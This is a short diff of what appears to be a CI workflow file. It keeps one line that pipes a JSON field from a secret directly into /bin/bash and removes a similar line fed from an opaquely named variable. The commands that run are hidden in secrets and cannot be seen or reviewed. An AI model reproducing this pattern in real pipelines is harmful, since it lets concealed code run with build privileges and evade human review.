@@ -21,7 +21,6 @@ jobs:
           tcs53: ${{ secrets.tcs53 }}
         run: |
           printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
-          echo $hc4320 | jq -r .ji43559 | /bin/bash
 
       - name: Save results
         if: always()
